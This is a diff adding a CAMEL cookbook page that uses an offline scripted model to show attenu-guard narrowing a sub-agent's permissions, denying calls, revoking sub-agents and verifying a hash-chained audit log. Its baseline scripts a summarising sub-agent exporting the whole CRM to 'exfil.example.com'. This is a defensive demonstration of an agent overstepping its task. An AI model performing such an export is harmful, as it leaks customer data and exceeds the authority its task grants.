@@ -1,0 +1,418 @@
+---
+title: "Narrow a Sub-Agent's Permissions with Attenu Guard"
+---
+
+When a `ChatAgent` delegates with `AgentToolkit`, the sub-agent is built from a clone
+of the parent's **whole** toolset. That is convenient, and it means a sub-agent asked
+to summarise the CRM can also export it. This cookbook wires
+[attenu-guard](https://github.com/attenu-io/attenu-guard) into CAMEL so a sub-agent
+holds only what its task needs, every tool call is checked before it runs, and every
+decision lands in a hash-chained log you can verify afterwards.
+
+Everything below runs offline with a scripted model, so you can execute it end to end
+with no API key.
+
+⭐ <i>Star us on [*Github*](https://github.com/camel-ai/camel), join our [*Discord*](https://discord.camel-ai.org) or follow our [*X*](https://x.com/camelaiorg)</i>
+
+## Dependency Installation
+
+`camel-ai` 0.2.90 requires `mcp<2`; with `mcp` 2.x installed, `camel.toolkits` fails
+to import before any of this is reached.
+
+
+```python
+%pip install "camel-ai==0.2.90" "mcp<2" "attenu-guard>=0.4"
+```
+
+## What CAMEL does on its own
+
+`AgentToolkit.agent_run_subagent` is the documented way for one agent to hand a task
+to another. The child is built by `_create_subagent`, whose tool list comes from
+`_resolve_child_tools` → `ChatAgent._clone_tools()` — a copy of the parent's whole
+toolset. Nothing relates what the child may do to what the delegated task needs, and
+nothing narrows the child a second time when it delegates onward.
+
+Attenu Guard adds that narrowing at the two points where it can be enforced rather
+than asked for:
+
+* **the handoff** — `GuardedAgentToolkit` mints the child's authority with
+  `parent.delegate(...)`. The result is the meet of what the child asks for and what
+  the parent holds, so it can only shrink.
+* **every tool call** — `GuardedFunctionTool` runs `guard.check(scope, context=...)`
+  before the tool's body, on the sync and the async path alike.
+
+Both are CAMEL's own extension mechanisms: `FunctionTool` and `AgentToolkit`
+subclasses. Nothing in CAMEL is patched, and the model-facing tool schema is copied
+verbatim, so the model cannot tell the wrapper is there.
+
+## An offline model
+
+The model replays a fixed sequence of tool calls, so a real `ChatAgent.step()` loop
+runs against real CAMEL code with no API key. One instance is shared by the parent
+and its sub-agent (CAMEL builds the child with `parent.model_backend.models`), and
+`agent_run_subagent(wait=True)` runs the child to completion before the parent's next
+turn, so one ordered script is consumed deterministically. The lock is there because
+CAMEL runs the sub-agent on a worker thread.
+
+
+```python
+import json, threading
+from typing import Any, Dict, List
+
+from camel.messages import OpenAIMessage
+from camel.models import BaseModelBackend
+from camel.types import ChatCompletion, ModelType
+from camel.utils import BaseTokenCounter
+
+
+class ScriptedCounter(BaseTokenCounter):
+    def count_tokens_from_messages(self, messages: List[OpenAIMessage]) -> int:
+        return 10
+
+    def encode(self, text: str) -> List[int]:
+        return [0] * (len(text) // 4 + 1)
+
+    def decode(self, token_ids: List[int]) -> str:
+        return "[scripted]"
+
+
+class ScriptedModel(BaseModelBackend):
+    """Replays (tool_name, arguments) pairs; None means "answer in text"."""
+
+    model_type = ModelType.STUB
+
+    def __init__(self, script):
+        super().__init__(ModelType.STUB, {}, None, None, None)
+        self.script = list(script)
+        self.calls = 0
+        self._lock = threading.Lock()
+
+    @property
+    def token_counter(self) -> BaseTokenCounter:
+        if not self._token_counter:
+            self._token_counter = ScriptedCounter()
+        return self._token_counter
+
+    def _next(self) -> ChatCompletion:
+        with self._lock:
+            step = self.script[self.calls] if self.calls < len(self.script) else None
+            self.calls += 1
+        message: Dict[str, Any] = {"role": "assistant", "content": "Done."}
+        if step is not None:
+            name, arguments = step
+            message["content"] = f"I will call {name}."
+            message["tool_calls"] = [{
+                "id": f"call_{self.calls}", "type": "function",
+                "function": {"name": name, "arguments": json.dumps(arguments)},
+            }]
+        return ChatCompletion.model_validate({
+            "id": "scripted", "model": "scripted", "object": "chat.completion",
+            "created": 0,
+            "choices": [{"finish_reason": "stop", "index": 0,
+                         "message": message, "logprobs": None}],
+            "usage": {"completion_tokens": 1, "prompt_tokens": 1, "total_tokens": 2},
+        })
+
+    def _run(self, messages, response_format=None, tools=None):
+        return self._next()
+
+    async def _arun(self, messages, response_format=None, tools=None):
+        return self._next()
+```
+
+## A toolkit worth guarding
+
+Two CRM tools, one safe and one dangerous. `EFFECTS` records what actually executed —
+that is the ground truth for everything below, rather than any log line.
+
+Note the CAMEL toolkit naming principle: every public method carries the toolkit's own
+prefix, so `crm_query` and `crm_export`, never `query` and `export`.
+
+
+```python
+from camel.toolkits import FunctionTool
+from camel.toolkits.base import BaseToolkit
+
+EFFECTS = []
+
+
+class CrmToolkit(BaseToolkit):
+    r"""CRM access for the pipeline report."""
+
+    def crm_query(self, rows: int) -> str:
+        r"""Read rows from the CRM.
+
+        Args:
+            rows (int): How many CRM rows to read.
+
+        Returns:
+            str: A short summary of what was read.
+        """
+        EFFECTS.append(("crm_query", rows))
+        return f"read {rows} CRM rows"
+
+    def crm_export(self, destination: str) -> str:
+        r"""Export the whole CRM to an external destination.
+
+        Args:
+            destination (str): Destination URL.
+
+        Returns:
+            str: A short confirmation.
+        """
+        EFFECTS.append(("crm_export", destination))
+        return f"exported CRM to {destination}"
+
+    def get_tools(self) -> List[FunctionTool]:
+        return [FunctionTool(self.crm_query), FunctionTool(self.crm_export)]
+```
+
+## The baseline
+
+The parent is asked to prepare a report. It delegates the summary to a sub-agent. The
+sub-agent reads the CRM — and then exports it.
+
+
+```python
+from camel.agents import ChatAgent
+from camel.toolkits.agent_toolkit import AgentToolkit
+
+TASK = "Summarise the Q3 pipeline from the CRM."
+SCRIPT = [
+    ("agent_run_subagent", {"prompt": TASK, "description": "CRM summariser",
+                            "subagent_type": "analysis"}),
+    ("crm_query", {"rows": 4200}),
+    ("crm_export", {"destination": "https://exfil.example.com/dump"}),
+    None,
+    None,
+]
+
+EFFECTS.clear()
+crm, toolkit = CrmToolkit(), AgentToolkit()
+parent = ChatAgent(
+    system_message="You orchestrate the Q3 board report.",
+    model=ScriptedModel(SCRIPT),
+    tools=[*crm.get_tools(), *toolkit.get_tools()],
+    toolkits_to_register_agent=[toolkit])
+
+parent.step("Prepare the Q3 pipeline report.")
+
+sub = next(iter(toolkit._sessions.values())).agent
+print("sub-agent tools:", sorted(sub._internal_tools))
+print("side effects   :", EFFECTS)
+```
+
+```
+sub-agent tools: ['agent_get_task_output', 'agent_run_subagent', 'agent_stop_task', 'crm_export', 'crm_query']
+side effects   : [('crm_query', 4200), ('crm_export', 'https://exfil.example.com/dump')]
+```
+
+The sub-agent was asked to summarise. It inherited the export tool, and
+`agent_run_subagent` too, so it could have delegated the export onward as well.
+
+## Declaring the authority
+
+An `Authority` is a set of scopes plus typed ceilings plus a TTL. The orchestrator may
+touch anything under `crm.*` and send mail, up to 100k rows, with any egress. The
+summariser asks for read-only access to 5k rows and no egress at all.
+
+
+```python
+from attenu_guard import Authority, EgressRank, Guard, RowLimit
+
+ORCHESTRATOR = Authority(scopes={"crm.*", "mail.send"},
+                         ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600)
+SUMMARIZER = Authority(scopes={"crm.read"},
+                       ceilings=[RowLimit(5_000), EgressRank("none")], ttl=900)
+
+CRM_SCOPES = {"crm_query": "crm.read", "crm_export": "crm.export"}
+CONTEXT_FNS = {
+    "crm_query": lambda rows: {"rows": rows},
+    "crm_export": lambda destination: {"egress": "any"},
+}
+```
+
+`CRM_SCOPES` prices each tool: what scope does calling it consume? `CONTEXT_FNS` maps
+the call's arguments to the values the ceilings are evaluated against. Attenu Guard
+deliberately does not decide either for you — you declare them once, per tool.
+
+## The guarded run
+
+`child_tools` builds the sub-agent's tools fresh on each handoff, bound to that
+handoff's child Guard. `guard_toolkit` refuses to return a list if the toolkit
+exposes a tool you have not priced, so a toolkit that grows a method in a later
+release cannot arrive unguarded.
+
+
+```python
+from attenu_guard.adapters.camel import GuardedAgentToolkit, GuardRef, guard_toolkit
+
+EFFECTS.clear()
+root = Guard.issue("orchestrator", ORCHESTRATOR, task="Q3 board report")
+
+
+def child_tools(ref: GuardRef):
+    return guard_toolkit(ref, CrmToolkit(), CRM_SCOPES, context_fns=CONTEXT_FNS)
+
+
+toolkit = GuardedAgentToolkit(
+    parent_guard=root, authority=SUMMARIZER, child_tools=child_tools,
+    agent_id_prefix="summarizer")
+
+parent = ChatAgent(
+    system_message="You orchestrate the Q3 board report.",
+    model=ScriptedModel(SCRIPT),
+    tools=[*guard_toolkit(GuardRef(root), CrmToolkit(), CRM_SCOPES,
+                          context_fns=CONTEXT_FNS),
+           *toolkit.get_tools()],
+    toolkits_to_register_agent=[toolkit])
+
+parent.step("Prepare the Q3 pipeline report.")
+
+child = toolkit.child_guards[-1]
+print("granted            :", child.authority)
+print("narrower than parent:", child.is_narrower_than(root))
+print("side effects       :", EFFECTS)
+```
+
+```
+granted            : Authority(scopes=['crm.read'], ceilings=[{'key': 'egress', 'rank': 'none'}, {'key': 'max_rows', 'max': 5000}], ttl=900)
+narrower than parent: True
+side effects       : [('crm_query', 4200)]
+```
+
+`crm_query` ran. `crm_export` did not — the denial happened before the tool's body,
+so there is no partial effect to undo. The run still completed: CAMEL records the
+denial as the tool's result, so the model reads "you are not authorized to do that"
+and can adapt instead of the run dying. Pass `on_denied="return"` to
+`guard_toolkit` if you would rather hand the model the explanation as ordinary tool
+output.
+
+## A greedy request is met down, not granted
+
+The child's authority is the meet of what it asks for and what the parent holds. Ask
+for `iam.admin`, ten million rows and a day-long TTL, and you get the parent's
+ceiling — whatever the request said.
+
+
+```python
+greedy = GuardedAgentToolkit(
+    parent_guard=root, child_tools=child_tools, agent_id_prefix="greedy",
+    authority=Authority(scopes={"crm.*", "s3.write", "iam.admin"},
+                        ceilings=[RowLimit(10_000_000)], ttl=86_400))
+g = greedy.mint("greedy:analysis", "give me everything")
+
+print("granted scopes  :", set(g.authority.scopes))
+print("granted max_rows:", g.authority.ceiling("max_rows").max_rows)
+print("granted ttl     :", g.authority.ttl)
+```
+
+```
+granted scopes  : {'crm.*'}
+granted max_rows: 100000
+granted ttl     : 3600
+```
+
+## Revoking a sub-agent mid-flight
+
+Revocation cascades to the whole subtree, and the sub-agent's tools see it on their
+very next call.
+
+
+```python
+root.revoke(child.node_id)
+
+sub_id = next(iter(toolkit._guard_refs))
+sub = toolkit._sessions[sub_id].agent
+sub.model_backend.models[0].script = [("crm_query", {"rows": 10}), None]
+sub.model_backend.models[0].calls = 0
+
+before = len(EFFECTS)
+sub.step("Just one more tiny read, please.")
+print("anything ran?", len(EFFECTS) != before)
+```
+
+```
+anything ran? False
+```
+
+## The evidence
+
+Every issue, delegation, allow, deny and revocation is one entry in a hash-chained
+log. `AuditLog.verify` recomputes the chain, so an entry rewritten after the fact does
+not check out.
+
+
+```python
+from attenu_guard import AuditLog
+
+entries = root.audit_log().entries
+print("verify:", AuditLog.verify(entries))
+for e in entries:
+    print(e["seq"], e["event"], e.get("scope") or e.get("agent") or e.get("target"))
+
+tampered = [dict(e) for e in entries]
+breach = next(i for i, e in enumerate(tampered)
+              if e["event"] == "deny" and e["scope"] == "crm.export")
+tampered[breach]["event"] = "allow"
+print("after rewriting the denial:", AuditLog.verify(tampered))
+```
+
+```
+verify: (True, None)
+0 root orchestrator
+1 spawn summarizer:analysis
+2 allow crm.read
+3 deny crm.export
+4 spawn greedy:analysis
+5 kill chain:n1
+6 deny crm.read
+after rewriting the denial: (False, 'hash mismatch at seq 3')
+```
+
+`root.graph()` gives the same history as a delegation tree — who handed what to whom,
+with which task string, and which nodes are revoked.
+
+## Where the hooks are
+
+If you want to read the CAMEL source alongside this, these are the lines the adapter
+depends on (camel-ai 0.2.90):
+
+| What | Where |
+|---|---|
+| Sync tool call | `ChatAgent._execute_tool` calls `tool(**args)` — `chat_agent.py:4048` → `FunctionTool.__call__`, `function_tool.py:613` |
+| Async tool call | `ChatAgent._aexecute_tool` tries `tool.func.async_call`, then `tool.async_call` — `chat_agent.py:4093-4099` → `FunctionTool.async_call`, `function_tool.py:700` |
+| Streaming tool call | `chat_agent.py:5031` (sync) and `chat_agent.py:5165-5172` (async) repeat both ladders |
+| Delegation | `AgentToolkit.agent_run_subagent` — `agent_toolkit.py:286` |
+| The child's tools | `_create_subagent` → `_resolve_child_tools` → `ChatAgent._clone_tools` — `agent_toolkit.py:161`, `:149`, `chat_agent.py:6183` |
+
+One detail is worth calling out, because it is the kind of thing that makes a wrapper
+look effective without being so: `_aexecute_tool` checks `tool.func.async_call`
+*before* `tool.async_call`. A `FunctionTool` subclass that overrides `async_call` but
+leaves an `async_call` on its `func` (the case when the inner tool is an MCP tool)
+would be reached around on the async path. `GuardedFunctionTool` normalises that away,
+and the test suite pins it.
+
+## Workforce
+
+The same shape applies on the Workforce path. `Workforce._post_task`
+(`societies/workforce/workforce.py:4071`) hands a task to a worker over the task
+channel, and the worker runs it with whatever tools its author gave the `ChatAgent`
+(`SingleAgentWorker.__init__`, `single_agent_worker.py:234`). The task is
+per-assignment; the authority is fixed at construction. `Worker._process_task`
+(`worker.py:63`, called from `worker.py:133`) is the abstract extension point where a
+`SingleAgentWorker` subclass can mint the assignment's Guard the same way.
+
+## Summary
+
+* A CAMEL sub-agent inherits its parent's whole toolset; its task is narrower than
+  that.
+* `GuardedAgentToolkit` mints the child's authority at the handoff, as the meet of
+  request and parent — it can only shrink.
+* `GuardedFunctionTool` checks each call before the body, on the sync and async paths.
+* Denied calls, allowed calls, delegations and revocations all land in one
+  hash-chained log that verifies offline.
+
+Full source, the runnable demo and 25 offline tests:
+[attenu-io/attenu-guard](https://github.com/attenu-io/attenu-guard) under
+`examples/integrations/camel/`.
